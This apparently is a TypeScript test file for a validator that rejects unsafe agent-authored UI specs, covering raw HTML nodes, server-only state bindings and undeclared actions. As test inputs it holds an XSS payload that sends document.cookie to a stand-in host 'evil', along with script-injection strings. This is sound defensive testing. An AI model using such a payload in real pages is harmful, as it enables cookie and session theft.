/**
 * AN-5 — the typed component catalog, the view-tree IR, and the validator
 * that make agent-authored UI safe by construction. Promoted from
 * `future/agent/generative-view-spec.spec.ts` once every spec passed.
 *
 * The load-bearing claim (`AGENT_NATIVE_NOTES.md` §4.2): "a validated spec
 * **cannot express** the secret-leak failure mode." These tests are mostly
 * negative: each names a thing an agent might try and asserts it is
 * rejected, with no rendering side effect. `DQ-090` (ratified): the IR has
 * no markup-bearing node kind at all — raw HTML is rejected at the schema
 * boundary because it is unrepresentable, not because a validator caught
 * it. The lowering targets json-render v0.20.0 semantics
 * (`docs/af-ui-json-render/JSON_RENDER_V0.20_UPSTREAM.md`).
 *
 * Every rejection test carries a NEGATIVE CONTROL, and near-neighbour codes
 * (unknown component vs unknown slot vs unknown node kind; read-only
 * binding vs server-only field) are asserted to differ so one generic
 * "something is wrong" code cannot cover them all.
 */

import { Effect, Schema } from "effect";
import { describe, expect, it } from "vitest";
import * as Agent from "../Agent.js";
import * as Portable from "../Portable.js";
import {
  action,
  bindState,
  componentCatalog,
  componentEntry,
  decodeSpec,
  element,
  NodeKinds,
  on,
  slotSpec,
  state as stateRefOf,
  stateModel,
  text,
  validate,
  viewTree,
  type SpecNode,
  type StateValueRef,
} from "../ViewSpec.js";
import { lower } from "../view-spec-json-render.js";

const run = <A, E>(effect: Effect.Effect<A, E>): Promise<A> => Effect.runPromise(effect);
const runFail = async <A, E>(effect: Effect.Effect<A, E>): Promise<E> => {
  const flipped = await Effect.runPromiseExit(effect.pipe(Effect.flip));
  if (flipped._tag !== "Success") {
    throw new Error("expected a typed failure, but the effect succeeded");
  }
  return flipped.value;
};

/** A serializable IR must survive a JSON round trip intact. */
const jsonRoundTrips = (value: unknown): boolean => {
  try {
    return JSON.stringify(JSON.parse(JSON.stringify(value))) === JSON.stringify(value);
  } catch {
    return false;
  }
};

/** Recursively collect every function found in a value (must be empty for IR). */
const findFunctions = (value: unknown, path = "$"): ReadonlyArray<string> => {
  if (typeof value === "function") return [path];
  if (Array.isArray(value)) {
    return value.flatMap((item, index) => findFunctions(item, `${path}[${index}]`));
  }
  if (typeof value === "object" && value !== null) {
    return Object.entries(value).flatMap(([key, item]) => findFunctions(item, `${path}.${key}`));
  }
  return [];
};

/** Collect every string in a value, for leak assertions. */
const allStrings = (value: unknown): ReadonlyArray<string> => {
  if (typeof value === "string") return [value];
  if (Array.isArray(value)) return value.flatMap(allStrings);
  if (typeof value === "object" && value !== null) {
    return Object.entries(value).flatMap(([key, item]) => [key, ...allStrings(item)]);
  }
  return [];
};

/**
 * A small typed catalog: one Card component with a `body` slot, one exposed
 * action, one state model with a writable and a read-only field.
 */
const makeCatalog = () => {
  const state = stateModel({
    name: "ProjectPage",
    fields: {
      // Writable: legal two-way binding target.
      draftTitle: { type: Schema.String, writable: true },
      // Read-only projection: two-way binding must be refused.
      projectId: { type: Schema.String, writable: false },
      // Never leaves the server: not addressable from a spec at all.
      apiToken: { type: Schema.String, writable: false, serverOnly: true },
    },
  });

  return {
    state,
    catalog: componentCatalog({
      Card: componentEntry({
        name: "Card",
        description: "A titled card",
        props: Schema.Struct({ title: Schema.String }),
        slots: { body: slotSpec({ many: true }) },
      }),
      TextField: componentEntry({
        name: "TextField",
        description: "A text input",
        props: Schema.Struct({ value: Schema.String }),
        slots: {},
      }),
    }),
    actions: ["project.rename"] as const,
    state_model: state,
  };
};

describe("AN-5 view-spec IR", () => {
  it("a well-formed agent-emitted spec validates, and the tree is closure-free and serializable", async () => {
    const { catalog } = makeCatalog();

    const root = element("Card", {
      props: { title: "Sprint 3" },
      slots: { body: [text("Two open items")] },
    });
    const tree = viewTree(root);

    const diagnostics = await run(validate(tree, { catalog }));
    expect(diagnostics).toEqual([]);

    // The whole point of a spec rather than HTML: it is data.
    expect(findFunctions(tree)).toEqual([]);
    expect(jsonRoundTrips(tree)).toBe(true);
    // Node kinds are literal tags, so a host can dispatch on them.
    expect(tree.root.kind).toBe("ui.element");
    expect(root.slots.body![0]!.kind).toBe("ui.text");
  });

  it("an unknown component is rejected, and a known one is not", async () => {
    const { catalog } = makeCatalog();

    const diagnostics = await run(
      validate(viewTree(element("ScriptRunner", { props: {}, slots: {} })), { catalog }),
    );

    // Exactly this code and nothing else, so an over-eager validator is caught.
    expect(diagnostics.map((d) => d.code)).toEqual(["ui:unknown-catalog-component"]);
    expect(diagnostics.every((d) => d.severity === "error")).toBe(true);
    // Diagnostics point at the offending node so a host can explain the refusal.
    expect(JSON.stringify(diagnostics)).toContain("ScriptRunner");

    // NEGATIVE CONTROL: a catalogued component with valid props is silent.
    // Without this, `return [unknownCatalogComponent]` passes forever.
    expect(
      await run(
        validate(
          viewTree(element("Card", { props: { title: "Sprint 3" }, slots: {} })),
          { catalog },
        ),
      ),
    ).toEqual([]);
  });

  it("an unknown slot on a known component is rejected, with its own code", async () => {
    const { catalog } = makeCatalog();

    const diagnostics = await run(
      validate(
        viewTree(
          element("Card", {
            props: { title: "Sprint 3" },
            slots: { footer: [text("nope")] },
          }),
        ),
        { catalog },
      ),
    );

    expect(diagnostics.map((d) => d.code)).toEqual(["ui:component-unknown-slot"]);
    // Unknown component and unknown slot are near neighbours; a single generic
    // code would satisfy both this test and the one above.
    expect(diagnostics[0]!.code).not.toBe("ui:unknown-catalog-component");

    // NEGATIVE CONTROL: the component's *declared* slot is accepted.
    expect(
      await run(
        validate(
          viewTree(
            element("Card", {
              props: { title: "Sprint 3" },
              slots: { body: [text("fine")] },
            }),
          ),
          { catalog },
        ),
      ),
    ).toEqual([]);
  });

  it("a two-way binding to a non-writable target is rejected", async () => {
    const { catalog, state } = makeCatalog();

    // Writable field: fine.
    const ok = await run(
      validate(
        viewTree(
          element("TextField", {
            props: { value: bindState(state.fields.draftTitle) },
            slots: {},
          }),
        ),
        { catalog, state },
      ),
    );
    expect(ok).toEqual([]);

    // Read-only field: refused, per the doc's severity table ("Two-way binding
    // to read-only path/field: error").
    const bad = await run(
      validate(
        viewTree(
          element("TextField", {
            props: { value: bindState(state.fields.projectId) },
            slots: {},
          }),
        ),
        { catalog, state },
      ),
    );
    expect(bad.map((d) => d.code)).toEqual(["ui:two-way-binding-readonly"]);
    expect(bad.every((d) => d.severity === "error")).toBe(true);
    // Read-only and server-only are near neighbours (both are "you may not
    // bind that field"), and a host needs to distinguish "this field is a
    // projection" from "this field must never leave the server".
    expect(bad[0]!.code).not.toBe("ui:server-only-field-bound-to-client");
  });

  it("an undeclared action is rejected", async () => {
    const { catalog, actions } = makeCatalog();

    const withDeclared = viewTree(
      element("Card", {
        props: { title: "x" },
        slots: {},
        events: [on("click", action("project.rename", {}))],
      }),
    );
    expect(await run(validate(withDeclared, { catalog, actions }))).toEqual([]);

    const withUndeclared = viewTree(
      element("Card", {
        props: { title: "x" },
        slots: {},
        events: [on("click", action("billing.refundEverything", {}))],
      }),
    );
    const diagnostics = await run(validate(withUndeclared, { catalog, actions }));
    expect(diagnostics.map((d) => d.code)).toEqual(["ui:action-not-registered"]);
    // Allowlisting is positive, not negative: an action absent from the
    // allowlist is refused even though it exists in the app.
    expect(JSON.stringify(diagnostics)).toContain("billing.refundEverything");
  });

  it("DQ-090: the IR has NO markup-bearing node kind, so raw HTML is unrepresentable rather than caught", async () => {
    // Ratified (`AGENT_NATIVE_NOTES.md` §10, DQ-090): *there is no `ui.html`
    // node kind; text nodes carry `value`, never `html`.* This is an
    // EXPRESSIVENESS property, not a diagnostic — the earlier reading of this
    // spec asserted a `ui:raw-html-unsupported` / `ui:unknown-node-kind`
    // diagnostic, which is strictly weaker: a diagnostic can be disabled,
    // downgraded, or bypassed by a second entry point, whereas a kind that does
    // not exist cannot be constructed at all. Rejection therefore happens at the
    // *schema boundary* in `decodeSpec`, before any validator runs.
    const { catalog } = makeCatalog();

    // 1. The kind set itself is the specification. No markup-bearing kind is a
    //    member — and this is what a later contributor must contradict in order
    //    to reintroduce one.
    expect(Array.isArray(NodeKinds)).toBe(true);
    expect(NodeKinds).toContain("ui.element");
    expect(NodeKinds).toContain("ui.text");
    for (const forbidden of ["ui.html", "ui.raw", "ui.rawHtml", "ui.markup", "ui.script"]) {
      expect(NodeKinds).not.toContain(forbidden);
    }

    // 2. `decodeSpec` is the trust boundary for agent output. A `ui.html`-shaped
    //    node fails the SCHEMA — it decodes to nothing, because the union it
    //    would have to inhabit has no such member — and the rejected markup is
    //    not echoed back in the error.
    const rawHtmlNode = {
      kind: "ui.html",
      html: "<img src=x onerror=\"fetch('https://evil/'+document.cookie)\">",
    };
    const decodeError = await runFail(
      decodeSpec({ kind: "ui.viewTree", root: rawHtmlNode }),
    );
    expect(String(decodeError._tag)).toContain("ViewSpec");
    expect(JSON.stringify(decodeError)).not.toContain("onerror");
    // The refusal is about the *kind*, so a host can explain it, and it is not a
    // "this component is missing from the catalog" story — adding `ui.html` to a
    // catalog must not be a workaround.
    expect(JSON.stringify(decodeError)).toContain("ui.html");
    expect(JSON.stringify(decodeError)).not.toContain("unknown-catalog-component");

    // 3. Nothing downstream of the boundary is load-bearing for this property:
    //    a hand-constructed node never reaches a renderer, because a validated
    //    tree can only have come through `decodeSpec`. Asserting the validator's
    //    behaviour here would re-describe the property as a check, so the only
    //    thing asserted is that it does not silently ACCEPT it.
    //    The forged cast is the deliberate dynamic escape hatch an agent's
    //    raw JSON effectively takes.
    const bypassed = await run(
      validate(viewTree(rawHtmlNode as unknown as SpecNode), { catalog }),
    );
    expect(bypassed).not.toEqual([]);
    expect(bypassed.every((d) => d.severity === "error")).toBe(true);

    // 4. NEGATIVE CONTROL: an equivalent tree built from the real constructors
    //    both decodes and validates clean, so "reject every tree" cannot pass.
    const safe = viewTree(
      element("Card", { props: { title: "Sprint 3" }, slots: { body: [text("hi")] } }),
    );
    const decoded = await run(decodeSpec(JSON.parse(JSON.stringify(safe))));
    expect(decoded.root.kind).toBe("ui.element");
    if (decoded.root.kind === "ui.element") {
      expect(decoded.root.component).toBe("Card");
    }
    expect(await run(validate(safe, { catalog }))).toEqual([]);

    // 5. Text carries `value`, never `html`: the second half of the ratified
    //    rule, and the reason markup cannot re-enter through the one node kind
    //    that does carry a string. Content is data, never interpreted.
    const textNode = text("<script>alert(1)</script>");
    expect(textNode.kind).toBe("ui.text");
    expect(textNode.value).toBe("<script>alert(1)</script>");
    expect(Object.keys(textNode)).not.toContain("html");
    // …and it survives the boundary unchanged, still as `value`.
    const decodedText = await run(
      decodeSpec(JSON.parse(JSON.stringify(viewTree(textNode)))),
    );
    expect(decodedText.root.kind).toBe("ui.text");
    if (decodedText.root.kind === "ui.text") {
      expect(decodedText.root.value).toBe("<script>alert(1)</script>");
    }
    expect(Object.keys(decodedText.root)).not.toContain("html");
    // A text node that tries to smuggle markup in under an `html` field is
    // rejected at the same boundary rather than having the field ignored.
    await runFail(
      decodeSpec({
        kind: "ui.viewTree",
        root: { kind: "ui.text", html: "<script>alert(1)</script>" },
      }),
    );
  });

  it("a validated spec cannot express the secret-leak failure mode", async () => {
    // This is the security property §4.2 claims dominates sandboxed HTML. Three
    // things must hold at once: server-only state is unaddressable, there is no
    // escape hatch that carries an opaque string into the output, and nothing an
    // agent writes can reach a value the catalog did not expose.
    const stateRef = stateRefOf;
    const { catalog, state } = makeCatalog();

    const leak = viewTree(
      element("Card", {
        props: { title: stateRef(state.fields.apiToken) },
        slots: {},
      }),
    );

    const diagnostics = await run(validate(leak, { catalog, state }));
    expect(diagnostics.map((d: any) => d.code)).toEqual([
      "ui:server-only-field-bound-to-client",
    ]);
    expect(diagnostics.every((d) => d.severity === "error")).toBe(true);

    // A path the state model never declared is not even referenceable. The
    // forged cast is the deliberate dynamic escape hatch: an agent emits
    // JSON, so the runtime validator — not the constructors' types — is what
    // must catch it.
    const forgedRef = {
      kind: "ui.stateValue",
      path: { segments: ["secrets", "root"] },
    } as unknown as StateValueRef;
    const undeclared = viewTree(
      element("Card", { props: { title: forgedRef }, slots: {} }),
    );
    const undeclaredDiagnostics = await run(validate(undeclared, { catalog, state }));
    expect(undeclaredDiagnostics.map((d) => d.code)).toEqual([
      "ui:unknown-state-path",
    ]);
    // "Field exists but is server-only" and "field does not exist" are different
    // refusals: collapsing them would tell an agent a secret field is merely
    // misspelled, or vice versa.
    expect(undeclaredDiagnostics[0]!.code).not.toBe(diagnostics[0]!.code);

    // NEGATIVE CONTROL: a client-visible declared field reads cleanly, so a
    // validator that rejects every state reference cannot pass.
    expect(
      await run(
        validate(
          viewTree(
            element("Card", {
              props: { title: stateRef(state.fields.draftTitle) },
              slots: {},
            }),
          ),
          { catalog, state },
        ),
      ),
    ).toEqual([]);
  });

  it("typed refs lower to JSON Pointer / $state only in the target plugin", async () => {
    const { state } = makeCatalog();

    const ref = stateRefOf(state.fields.draftTitle);
    const tree = viewTree(
      element("Card", { props: { title: ref }, slots: {} }),
    );

    // Core keeps a target-neutral path record: typed segments, no pointer string.
    expect(ref.kind).toBe("ui.stateValue");
    expect(ref.path.segments).toEqual(["draftTitle"]);
    expect(ref.path.writable).toBe(true);
    expect(allStrings(tree)).not.toContain("/draftTitle");
    expect(JSON.stringify(tree)).not.toContain("$state");

    // Only the plugin knows about `$state` and JSON Pointer.
    const lowered = await run(lower(tree));
    expect(JSON.stringify(lowered)).toContain("$state");
    expect(JSON.stringify(lowered)).toContain("/draftTitle");
    expect(jsonRoundTrips(lowered)).toBe(true);
  });

  it("[JR-P1/v0.20] lowering targets json-render v0.20: named slots survive, leaves carry children:[], action bindings carry params", async () => {
    // Upstream json-render v0.20.0 (vercel-labs/json-render #320) added
    // `UIElement.slots` as named structural child references — a 1:1 match
    // for our slot-shaped IR, so the lowering maps named slots VERBATIM
    // instead of flattening them into the default-children array (which
    // lost exactly the names our slot-contract system carries). #299 made
    // `children` explicitly required with `[]` on leaves (models omit it
    // ~1/3 of the time otherwise), and #307 forwards full
    // `{ action, params }` bindings, so params need no side channel.
    // See docs/af-ui-json-render/JSON_RENDER_V0.20_UPSTREAM.md.
    const tree = viewTree(
      element("Card", {
        props: { title: "Sprint 3" },
        slots: { body: [text("Two open items")] },
        events: [on("click", action("project.rename", { projectId: "p-1" }))],
      }),
    );

    const lowered = await run(lower(tree));
    const json = JSON.stringify(lowered);

    // Named slots survive AS slots: the name "body" appears under a `slots`
    // field, and the lowering invented no wrapper element to fake it.
    expect(json).toContain('"slots"');
    expect(json).toContain('"body"');

    // Every lowered ELEMENT carries a `children` array — `[]` on leaves,
    // never omitted (upstream models drop the required field otherwise;
    // our lowering is not allowed to reproduce that bug deterministically).
    const elements: Array<any> = [];
    const walk = (value: unknown): void => {
      if (Array.isArray(value)) {
        for (const item of value) walk(item);
        return;
      }
      if (typeof value === "object" && value !== null) {
        const record = value as Record<string, unknown>;
        if (typeof record.type === "string") elements.push(record);
        for (const item of Object.values(record)) walk(item);
      }
    };
    walk(lowered);
    expect(elements.length).toBeGreaterThan(0);
    for (const loweredElement of elements) {
      expect(Array.isArray(loweredElement.children)).toBe(true);
    }

    // The action binding lowers WHOLE: name and params together (#307's
    // `executeAction(ActionBinding)` contract), so the allowlisted name and
    // its arguments cannot drift apart on the wire.
    expect(json).toContain("project.rename");
    expect(json).toContain("p-1");

    expect(jsonRoundTrips(lowered)).toBe(true);
  });

  it("the agent emit-spec action refuses an invalid spec through normal dispatch", async () => {
    // Generative UI is not a special surface: the agent emits a spec through a
    // catalog action like any other, and validation is the action's boundary.
    const { catalog } = makeCatalog();

    const c = Agent.catalog({
      renderView: Agent.emitViewSpec({ catalog, allowedActions: ["project.rename"] }),
    });

    // The emit action's buildId is library-owned; a host learns it from the
    // manifest, exactly as for any other tool.
    const manifest = await run(Agent.toolManifest(c));
    const buildId = manifest.tools[0]!.buildId;
    expect(buildId).toBe(Agent.viewSpecBuildId);

    const good = await run(
      Agent.dispatch(c)({
        tool: "renderView",
        args: [
          {
            kind: "ui.viewTree",
            root: {
              kind: "ui.element",
              component: "Card",
              props: { title: "Sprint 3" },
              slots: {},
              events: [],
            },
          },
        ],
        buildId,
      }).pipe(Effect.orDie),
    );
    // Ratified two-arm envelope (DQ-080). This is the NEGATIVE CONTROL for the
    // refusal below: a `renderView` action that rejected every spec would
    // otherwise satisfy the refusal assertions forever.
    expect(good.ok).toBe(true);

    const bad = await run(
      Agent.dispatch(c)({
        tool: "renderView",
        args: [
          {
            kind: "ui.viewTree",
            root: { kind: "ui.html", html: "<script>steal()</script>" },
          },
        ],
        buildId,
      }).pipe(Effect.orDie),
    );
    expect(bad.ok).toBe(false);
    if (!bad.ok) {
      const tag = typeof bad.error === "object" && bad.error !== null && "_tag" in bad.error
        ? String(bad.error._tag)
        : "none";
      expect(tag).toBe("ViewSpecInvalidError");
    }
    // The rejected payload is not echoed back into the response.
    expect(JSON.stringify(bad)).not.toContain("steal()");
  });

  // ─── Coverage beyond the promoted specs ────────────────────────────────────

  it("decodeSpec recurses through nested slots and rejects an undeclared field at depth", async () => {
    const nested = viewTree(
      element("Card", {
        props: { title: "outer" },
        slots: {
          body: [
            element("Card", {
              props: { title: "inner" },
              slots: { body: [text("leaf")] },
            }),
          ],
        },
      }),
    );
    const decoded = await run(decodeSpec(JSON.parse(JSON.stringify(nested))));
    expect(JSON.stringify(decoded)).toBe(JSON.stringify(nested));

    // The excess-key refusal reaches nested nodes, and the path names WHERE.
    const smuggled = JSON.parse(JSON.stringify(nested)) as {
      root: { slots: { body: Array<{ slots: { body: Array<Record<string, unknown>> } }> };
      };
    };
    smuggled.root.slots.body[0]!.slots.body[0]!.html = "<script>x</script>";
    const error = await runFail(decodeSpec(smuggled));
    expect(error._tag).toBe("ViewSpecDecodeError");
    expect(error.path).toContain("$.root.slots.body[0].slots.body[0]");
    expect(JSON.stringify(error)).not.toContain("script");
  });

  it("the viewTree wrapper itself rejects undeclared fields and foreign kinds", async () => {
    const withExtra = await runFail(
      decodeSpec({
        kind: "ui.viewTree",
        root: { kind: "ui.text", value: "hi" },
        script: "<script>x</script>",
      }),
    );
    expect(withExtra._tag).toBe("ViewSpecDecodeError");
    expect(JSON.stringify(withExtra)).not.toContain("script>");

    const wrongKind = await runFail(
      decodeSpec({ kind: "ui.document", root: { kind: "ui.text", value: "hi" } }),
    );
    expect(JSON.stringify(wrongKind)).toContain("ui.document");
  });

  it("a forged writable claim on a ref does not beat the state model", async () => {
    const { catalog, state } = makeCatalog();
    // The ref lies (`writable: true`); the model says projectId is read-only.
    // Verdicts come from the OPTIONS, never from claims the ref carries.
    const lyingRef = {
      kind: "ui.stateBinding",
      path: { segments: ["projectId"], writable: true },
    } as unknown as StateValueRef;
    const diagnostics = await run(
      validate(
        viewTree(element("TextField", { props: { value: lyingRef }, slots: {} })),
        { catalog, state },
      ),
    );
    expect(diagnostics.map((d) => d.code)).toEqual(["ui:two-way-binding-readonly"]);
  });

  it("lowering escapes JSON Pointer special characters per RFC 6901", async () => {
    const model = stateModel({
      name: "Weird",
      fields: { plain: { type: Schema.String, writable: true } },
    });
    // Forge segments containing the two characters RFC 6901 escapes; the
    // model lookup is bypassed on purpose — this pins the POINTER encoding.
    const ref = {
      kind: "ui.stateValue",
      path: { segments: ["a/b", "c~d"], writable: false },
    } as unknown as StateValueRef;
    void model;
    const lowered = await run(
      lower(viewTree(element("Card", { props: { title: ref }, slots: {} }))),
    );
    expect(JSON.stringify(lowered)).toContain("/a~1b/c~0d");
  });

  it("emitViewSpec refuses a decodable-but-invalid spec with diagnostic CODES, never spec content", async () => {
    const { catalog } = makeCatalog();
    const c = Agent.catalog({
      renderView: Agent.emitViewSpec({ catalog, allowedActions: [] }),
    });

    const bad = await run(
      Agent.dispatch(c)({
        tool: "renderView",
        args: [
          {
            kind: "ui.viewTree",
            root: {
              kind: "ui.element",
              component: "SecretExfiltrator",
              props: {},
              slots: {},
            },
          },
        ],
        buildId: Agent.viewSpecBuildId,
      }).pipe(Effect.orDie),
    );
    expect(bad.ok).toBe(false);
    if (!bad.ok) {
      const error = bad.error as { readonly _tag: string; readonly codes: ReadonlyArray<string> };
      expect(error._tag).toBe("ViewSpecInvalidError");
      expect(error.codes).toEqual(["ui:unknown-catalog-component"]);
    }
    // Codes travel; the agent's identifiers do not.
    expect(JSON.stringify(bad)).not.toContain("SecretExfiltrator");
  });
});
